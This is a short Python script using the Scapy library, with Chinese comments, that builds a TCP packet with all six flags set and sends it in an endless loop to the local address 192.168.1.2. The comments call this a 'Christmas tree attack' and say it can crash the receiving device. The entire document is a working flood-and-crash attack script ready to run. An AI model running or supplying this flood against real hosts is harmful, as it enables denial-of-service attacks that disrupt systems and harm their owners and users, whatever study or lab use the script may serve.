from scapy.all import *
pkt_tree=IP(dst='192.168.1.2')/TCP(flags=0x03f)
while True:
	send(pkt_tree)
  
  
# TCP报文包含6个标志位：URG、ACK、PSH、RST、SYN、FIN，不同的系统对这些标志位组合的应答是不同的：
# 6个标志位全部为1，就是圣诞树攻击。设备在受到圣诞树攻击时，会造成系统崩溃。
